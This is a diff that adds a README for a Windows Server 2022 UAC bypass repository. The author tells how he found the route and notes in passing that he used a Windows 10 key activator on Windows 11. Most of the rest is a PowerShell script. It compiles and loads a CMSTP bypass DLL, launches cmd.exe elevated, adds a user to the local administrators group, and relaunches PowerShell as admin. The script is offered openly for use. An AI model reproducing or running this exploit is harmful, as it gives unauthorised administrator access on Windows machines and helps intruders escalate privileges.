@@ -1,1 +1,58 @@
 # win-server2022-UAC-Bypass
+
+# Introduction
+
+* Hello folks, i am Patrick Hoogeveen Aka x0xr00t. 
+* The quest to this hunt started 6 day's a go.... 
+* The main thing i noticed when installing windows 11 and trying it out, was that i could use a windows 10 seruial key activator. 
+* This version it validiated on was not included in to the installer of windows 11 wich is enterprice, mine windows activated as such successfull. 
+* At that time i realized under the hood it still was the basic windows 10 for most of its structure, so with that came the next logics that came up to me. 
+* Most of the previous found local exploits should possible work on widows 11 so, with that in mind i started compiling a couple things like the needed files for the Bypass. 
+* I tested it and before i knew i had a cmd system32 incvoked .... i was like cewl we got local privesc :D
+* So with that i started to think well the windows server just been released how likely would it be same senario is going on here. 
+
+* Same sanario i mean under the hood previuos mentioned part above, the internal structure.
+* So i started transfering the files after i saw the windows 10 like start balk in windows server 2022, which made me realize this should be working. 
+* I run the files and stumbled on 2 password authentictions, and i was like ugh gotta find a way around this, so i digged around for a solution and well behold. 
+
+* After a while the popups where gone and system32 cmd with powershell admin invoked. Cewl privesc going on here :D 
+
+# idea to get rid of enoying popups box ... 
+* The how to was pretty easy as when the cmd is called its allready elevated, so i was like lets add a user before it calls the exec of the powershell. 
+* And well behold there it was working as i wanted it.
+* I closed all boxes took me off the admin group rights and rerun the exploit. 
+
+* Well behold we popped it again and i was like fuck its working nicely, added user thats non admin group to the admingroup to be able to exec elevated powershell. 
+
+
+# code example of the ps1 file i made for the UAC bypass 
+* This particular code needs to files to make it all work i will include all of them here in the repo. 
+
+
+#!-.ps1 
+#
+# Author : P.Hoogeveem
+# Aka    : x0xr00t
+# Build  : 20210809
+# Name   : UAC Bypass Win Server 2022
+# Impact : Privesc 
+# 
+# Usage  : run the powershell file and it makes the dll and places it in dir. 
+
+
+#
+Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "sl0p.dll"
+
+[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\sl0p.dll"))
+
+[CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe") 
+net localgroup administrators {userhere} /add
+If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
+{
+  # Relaunch as an elevated process:
+  Start-Process powershell.exe "-File",('"{0}"' -f $MyInvocation.MyCommand.Path) -Verb RunAs
+  exit
+}
+
+
+# Thats it enjoy
